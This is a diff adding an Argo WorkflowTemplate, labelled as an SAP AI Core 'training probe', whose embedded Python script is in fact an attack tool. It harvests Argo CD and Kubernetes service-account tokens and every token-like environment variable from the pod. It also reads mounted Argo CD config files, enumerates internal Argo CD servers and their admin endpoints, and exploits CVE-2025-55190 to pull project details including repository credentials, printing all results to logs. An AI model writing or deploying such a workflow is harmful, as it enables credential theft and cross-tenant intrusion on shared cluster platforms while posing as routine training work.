@@ -1,0 +1,168 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: probe-train-v9
+  labels:
+    scenarios.ai.sap.com/id: "bbprobe-global-1775842304"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "bbprobe-global-1775842304"
+    executables.ai.sap.com/name: "probe-train-v9"
+    executables.ai.sap.com/description: "training probe v9 - argocd api reachability + CVE-2025-55190"
+spec:
+  templates:
+  - name: probe
+    container:
+      image: python:3.11
+      command: ["/bin/sh", "-c"]
+      args:
+      - |
+        python3 - << 'EOF'
+        import os, ssl, json
+        import urllib.request, urllib.error
+
+        def report(k, v):
+            print(f"[PT9] {k}: {str(v)[:10000]}", flush=True)
+
+        def http_get(url, headers=None, timeout=8):
+            try:
+                req = urllib.request.Request(url, headers=headers or {})
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
+                    return r.read().decode(errors="replace"), r.status, dict(r.headers)
+            except urllib.error.HTTPError as e:
+                body = ""
+                try: body = e.read().decode(errors="replace")[:3000]
+                except: pass
+                return f"HTTP_{e.code}:{body}", e.code, {}
+            except Exception as e:
+                return f"ERR:{type(e).__name__}:{e}", 0, {}
+
+        report("START", "probe-train-v9 - argocd CVE-2025-55190")
+
+        # ── 1. HUNT FOR ARGOCD TOKENS IN THE POD ─────────────────────────────
+        report("---", "=== 1. ARGOCD TOKEN HUNT ===")
+
+        # Env vars
+        for k, v in os.environ.items():
+            kl = k.lower()
+            if any(x in kl for x in ["argocd", "argo_cd", "argo-cd", "gitops"]):
+                report(f"ENV_{k}", v[:500])
+
+        # Common mounted paths
+        for path in [
+            "/var/run/secrets/argocd",
+            "/etc/argocd",
+            "/app/config/server/tls",
+            "/var/run/argocd",
+            "/home/argocd",
+        ]:
+            if os.path.exists(path):
+                import os as _os
+                for root, dirs, files in _os.walk(path):
+                    for f in files:
+                        fpath = os.path.join(root, f)
+                        try:
+                            with open(fpath) as fp:
+                                report(f"FILE_{fpath.replace('/','_')}", fp.read(2000))
+                        except Exception as e:
+                            report(f"FILE_ERR_{fpath.replace('/','_')}", str(e))
+
+        # ── 2. REACH ARGOCD SERVERS ───────────────────────────────────────────
+        report("---", "=== 2. ARGOCD SERVER REACHABILITY ===")
+
+        ARGOCD_HOSTS = [
+            ("http",  "argocd-server.argocd.svc.cluster.local",         80),
+            ("https", "argocd-server.argocd.svc.cluster.local",         443),
+            ("http",  "argocd-server.argocd-tenants.svc.cluster.local", 80),
+            ("https", "argocd-server.argocd-tenants.svc.cluster.local", 443),
+        ]
+
+        reachable = []
+        for scheme, host, port in ARGOCD_HOSTS:
+            url = f"{scheme}://{host}:{port}/api/v1/version"
+            body, code, hdrs = http_get(url)
+            report(f"VERSION_{host}_{port}", f"[{code}] {body[:500]}")
+            if code in (200, 401, 403):
+                reachable.append((scheme, host, port))
+
+        # ── 3. UNAUTHENTICATED ENDPOINT ENUM ─────────────────────────────────
+        report("---", "=== 3. UNAUTHENTICATED ENDPOINTS ===")
+        for scheme, host, port in reachable:
+            base = f"{scheme}://{host}:{port}"
+            for path in [
+                "/api/v1/settings",
+                "/api/v1/projects",
+                "/api/v1/clusters",
+                "/api/v1/repositories",
+                "/api/version",
+                "/metrics",
+                "/healthz",
+            ]:
+                body, code, _ = http_get(f"{base}{path}")
+                if code != 0 and "ERR:timed" not in body:
+                    report(f"ANON_{path.replace('/','_')}_{port}", f"[{code}] {body[:1000]}")
+
+        # ── 4. CVE-2025-55190 -- TRY WITH ANY TOKEN WE FIND ──────────────────
+        report("---", "=== 4. CVE-2025-55190 PROJECT DETAILED ===")
+
+        # Tokens to try: SA token (even though automount=false, check anyway),
+        # any env var tokens, and common default/anonymous
+        tokens_to_try = [""]  # anonymous first
+
+        sa_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+        if os.path.exists(sa_token_path):
+            try:
+                with open(sa_token_path) as f:
+                    tokens_to_try.append(f.read().strip())
+                    report("SA_TOKEN_FOUND", "yes")
+            except: pass
+
+        # Any token-looking env vars
+        for k, v in os.environ.items():
+            if "token" in k.lower() and len(v) > 20:
+                tokens_to_try.append(v.strip())
+
+        for scheme, host, port in reachable:
+            base = f"{scheme}://{host}:{port}"
+
+            # First get project list to know which projects exist
+            for token in tokens_to_try:
+                hdrs = {"Authorization": f"Bearer {token}"} if token else {}
+                body, code, _ = http_get(f"{base}/api/v1/projects", headers=hdrs)
+                report(f"PROJECTS_{port}_tok{len(token)}", f"[{code}] {body[:2000]}")
+
+                if code == 200:
+                    try:
+                        projects = json.loads(body)
+                        for p in projects.get("items", [])[:10]:
+                            pname = p.get("metadata", {}).get("name", "")
+                            if pname:
+                                # CVE-2025-55190: /api/v1/projects/{project}/detailed
+                                detail_body, detail_code, _ = http_get(
+                                    f"{base}/api/v1/projects/{pname}/detailed",
+                                    headers=hdrs)
+                                report(f"CVE55190_{pname}", f"[{detail_code}] {detail_body[:5000]}")
+                    except Exception as e:
+                        report("CVE55190_PARSE_ERR", str(e))
+
+        # ── 5. TRY ARGOCD ADMIN API PATHS ─────────────────────────────────────
+        report("---", "=== 5. ADMIN + CLUSTER API PATHS ===")
+        for scheme, host, port in reachable:
+            base = f"{scheme}://{host}:{port}"
+            for path in [
+                "/api/v1/repocreds",
+                "/api/v1/repositories",
+                "/api/v1/clusters",
+                "/api/v1/accounts",
+                "/api/v1/accounts/admin",
+            ]:
+                body, code, _ = http_get(f"{base}{path}")
+                if code not in (0,) and "ERR:timed" not in body:
+                    report(f"ADMIN{path.replace('/','_')}_{port}", f"[{code}] {body[:2000]}")
+
+        report("DONE", "probe-train-v9 complete")
+        EOF
+  entrypoint: probe
